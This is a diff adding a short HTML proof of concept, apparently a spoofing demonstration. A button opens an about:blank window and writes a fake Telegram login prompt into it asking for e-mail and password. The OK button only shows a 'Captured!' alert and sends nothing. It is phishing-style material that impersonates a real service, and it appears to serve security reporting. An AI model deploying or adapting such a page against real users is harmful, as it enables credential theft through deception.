@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to Spoof</button>
+
+    <script>
+      function spoof() {
+        let win = window.open('about:blank', '_blank');
+        setTimeout(() => {
+          win.document.write(`
+            <style>
+              body {
+                font-family: sans-serif;
+                background: rgba(0,0,0,0.85);
+                color: white;
+                margin: 0;
+                padding: 20px;
+              }
+              .box {
+                background: #222;
+                padding: 20px;
+                border-radius: 10px;
+                max-width: 300px;
+                margin: 100px auto;
+                box-shadow: 0 0 20px #000;
+              }
+              input {
+                width: 100%;
+                margin-top: 10px;
+                padding: 10px;
+                border: none;
+                border-radius: 5px;
+              }
+              button {
+                margin-top: 15px;
+                padding: 10px;
+                width: 100%;
+                background: #3366ff;
+                color: white;
+                border: none;
+                border-radius: 5px;
+              }
+            </style>
+            <div class="box">
+              <h3>about:blank merespon</h3>
+              <p>In order to access telegram.com<br>you must first login on your Telegram Account.</p>
+              <p>Please type your e-mail<br>and your password:</p>
+              <input type="text" placeholder="E-mail / Password">
+              <button onclick="alert('Captured!')">OK</button>
+            </div>
+          `);
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
